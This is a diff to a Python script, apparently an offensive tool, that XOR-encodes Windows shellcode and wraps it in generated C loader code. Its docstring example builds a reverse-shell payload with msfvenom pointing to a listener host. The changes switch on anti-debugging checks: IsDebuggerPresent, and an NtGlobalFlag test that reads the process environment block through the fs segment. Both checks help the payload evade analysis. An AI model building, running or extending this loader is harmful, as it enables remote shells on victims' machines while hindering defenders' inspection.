@@ -1,7 +1,7 @@
 #!/usr/bin/env python2
 
 """
-XOR-encoded shellcode wrapper for Windows x86-32 (works fine on x86-64)
+Vigenere-based XOR encoding shellcode wrapper for Windows x86-32 (works fine on x86-64)
 
 Example:
 $ msfvenom -p windows/shell_reverse_tcp -f raw -b '\\x00\\xff' LHOST=192.168.56.1 LPORT=8080 \
@@ -12,8 +12,6 @@ $ msfvenom -p windows/shell_reverse_tcp -f raw -b '\\x00\\xff' LHOST=192.168.56.
 Refs:
 - https://msdn.microsoft.com/en-us/library/aa381043(v=vs.85).aspx
 
-ToDo:
-- multi byte key
 """
 
 import sys
@@ -41,7 +39,7 @@ HEADERS_C_CODE = """
 #include <ctype.h>
 #include <windows.h>
 
-#define DEBUG
+//#define DEBUG
 #undef DEBUG
 
 #define BIG_NUMBER 1<<30
@@ -59,19 +57,19 @@ DWORD WINAPI SpawnShellcode(LPVOID lpFuncPointer)
 
 int CheckNtGlobalFlag()
 {
-  int eax;
+  char *peb;
+  unsigned int *flag;
   asm ("xor %%eax, %%eax;"
-       "movl %%fs, %%eax;"
+       "movl %%fs:%p1, %%eax;"
        "movl %%eax, %0;"
-       : "=r" (eax)
-       :
-       : "eax" );
-  printf("fs is %#x\\n", eax);
-  eax = eax+0x30; // get peb
-  printf("fs[30h] is %#x\\n", eax);
-  eax = eax+0x68; // get flag
-  printf("NtGlobalFlag is %#x\\n", eax);
-  return eax & 0x70;
+       : "=r" (peb)
+       : "i"(48)
+       : "%eax" );
+  printf("peb is %#x\\n", peb);
+  flag = peb+0x68;
+  printf("NtGlobalFlag is at %#x\\n", flag);
+  printf("NtGlobalFlag is %#x\\n", *flag);
+  return *flag & 0x70;
 }
 
 
@@ -115,14 +113,15 @@ TEMPLATE_C_CODE = """
   LPVOID code;
   DWORD lpflOldProtect;
   HANDLE hdlThread, hdlMutex;
-
+  BOOL IsDbgPresent = FALSE;
   int retcode;
 
-  if(IsDebuggerPresent())
+  IsDbgPresent = IsDebuggerPresent();
+  if(IsDbgPresent)
     exit(1);
 
-  //if(CheckNtGlobalFlag())
-  //  exit(1);
+  if(CheckNtGlobalFlag())
+    exit(1);
 
   hdlMutex = CreateMutex(NULL, TRUE, _T("f0000000000000000000000000baaaaaaaaaaaaaaaaaaaar"));
   if(!hdlMutex)
@@ -390,7 +389,7 @@ if __name__ == "__main__":
     }
 
     if not args.quiet:
-        print ("[+] Generating random key")
+        print ("[+] Getting random offset")
 
     key = random.randint(0,255)
     fd, cname = tempfile.mkstemp(suffix=".c")
